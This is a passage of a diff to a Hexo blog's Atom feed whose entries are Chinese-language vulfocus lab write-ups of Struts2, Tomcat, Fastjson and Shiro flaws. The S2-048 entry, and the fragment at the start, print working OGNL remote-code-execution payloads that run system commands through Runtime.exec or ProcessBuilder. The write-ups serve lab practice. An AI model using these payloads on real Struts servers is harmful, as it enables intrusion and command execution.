class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-019 CVE-2013-4316复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-18T11:41:36.969Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li><li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.0 - 2.3.15.1&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-052 CVE-2017-9805复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:30.256Z</updated>
     
@@ -199,17 +177,39 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-048 CVE-2017-9791复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-18T11:42:32.170Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-053 CVE-2017-12611复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:28.158Z</updated>
     
@@ -221,17 +221,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-057 CVE-2018-11776复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:24.035Z</updated>
     
@@ -243,17 +243,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-059 CVE-2019-0230复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:20.640Z</updated>
     
@@ -266,17 +266,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-devMode CVE-2016-4438复现过程</title>
-    <link href="http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:17.346Z</updated>
     
@@ -288,17 +288,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>Tomcat-弱口令-getshell复现过程</title>
-    <link href="http://example.com/2020/08/12/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/12/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://hzktester.top/2020/08/12/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/12/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-12T11:10:00.000Z</published>
     <updated>2020-09-18T11:41:52.507Z</updated>
     
@@ -310,17 +310,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Tomcat" scheme="http://example.com/tags/Tomcat/"/>
+    <category term="Tomcat" scheme="https://hzktester.top/tags/Tomcat/"/>
     
   </entry>
   
   <entry>
     <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
-    <link href="http://example.com/2020/08/11/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
-    <id>http://example.com/2020/08/11/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</id>
+    <link href="https://hzktester.top/2020/08/11/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/08/11/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</id>
     <published>2020-08-11T00:35:00.000Z</published>
     <updated>2020-09-18T11:41:55.433Z</updated>
     
@@ -332,17 +332,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Tomcat" scheme="http://example.com/tags/Tomcat/"/>
+    <category term="Tomcat" scheme="https://hzktester.top/tags/Tomcat/"/>
     
   </entry>
   
   <entry>
     <title>Fastjson_1.2.24反序列化漏洞复现过程</title>
-    <link href="http://example.com/2020/08/08/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>http://example.com/2020/08/08/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://hzktester.top/2020/08/08/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/08/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-08T07:31:00.000Z</published>
     <updated>2020-09-18T11:41:46.320Z</updated>
     
@@ -355,17 +355,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Fastjson" scheme="http://example.com/tags/Fastjson/"/>
+    <category term="Fastjson" scheme="https://hzktester.top/tags/Fastjson/"/>
     
   </entry>
   
   <entry>
     <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
-    <link href="http://example.com/2020/08/06/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/"/>
-    <id>http://example.com/2020/08/06/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</id>
+    <link href="https://hzktester.top/2020/08/06/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/08/06/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</id>
     <published>2020-08-06T07:22:00.000Z</published>
     <updated>2020-09-18T12:14:07.084Z</updated>
     
@@ -378,10 +378,10 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="http://example.com/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Apache Shiro" scheme="http://example.com/tags/Apache-Shiro/"/>
+    <category term="Apache Shiro" scheme="https://hzktester.top/tags/Apache-Shiro/"/>
     
   </entry>
   
